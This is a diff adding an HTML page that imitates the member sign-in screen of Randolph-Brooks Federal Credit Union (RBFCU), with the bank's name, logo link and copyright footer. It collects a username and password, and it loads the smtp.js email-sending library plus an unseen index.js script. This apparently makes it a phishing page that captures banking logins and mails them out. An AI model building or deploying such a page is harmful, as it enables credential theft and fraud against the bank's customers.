@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=0.85, user-scalable=no">
+        
+        <title>RBFCU - Member Sign In</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <link rel="icon" href="ico.png" type="image/png">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+
+    <div class="chi">
+        <a href="index.html"><img src="header2.png" width="420" height="120"></a>
+    </div>
+    
+    <br><br><br>
+
+    <div class="next">
+        <p class="nexttext"><b>Member Sign In</b></p>
+    </div>
+
+    <form action="#" class="form-contact">
+
+        <input id="fusername" type="text" placeholder="Username" required>
+        <input id="fpassword" type="password" placeholder="Password" required>
+        <input id="fsubmit" type="submit" value="Sign In">
+
+        <!--javascript to change Submit to Loading after click, check css-->
+        <script>
+            var button = document.querySelector('.form-contact input[type="submit"]');
+            button.addEventListener('click', function() {
+                button.classList.add('clicked');
+                button.value = "Loading...";               
+                setTimeout(function() {
+                    button.classList.remove('clicked');
+                    button.value = "Sign In";
+                },  4000); 
+            });
+        </script>
+        <script src="index.js"></script>
+    <form>
+
+    
+
+</body>
+<footer class="footer">
+
+    <p class="foot">©2023 Randolph-Brooks Federal Credit Union.</p>
+
+</footer>
+</html>
